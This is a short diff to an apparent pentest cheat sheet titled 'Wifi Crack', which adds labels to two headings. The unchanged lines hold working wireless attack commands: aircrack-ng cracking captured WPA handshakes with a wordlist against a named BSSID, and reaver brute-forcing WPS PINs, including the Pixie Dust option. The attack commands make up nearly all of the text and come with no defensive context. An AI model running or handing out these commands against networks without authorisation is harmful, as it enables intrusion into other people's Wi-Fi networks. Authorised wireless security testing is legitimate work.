@@ -1,10 +1,10 @@
 # Wifi Crack
 
-Aircrack:
+Aircrack: (Hash)
 
 	aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk\*.cap
 
-Reaver:
+Reaver: (PSK)
 
 	reaver -i mon0 -c 6 -b 00:23:69:48:33:95 -vv
 	reaver -i wlan0mon <replace with yours> -b <bssid> -c <channel no> -K 1 -vv
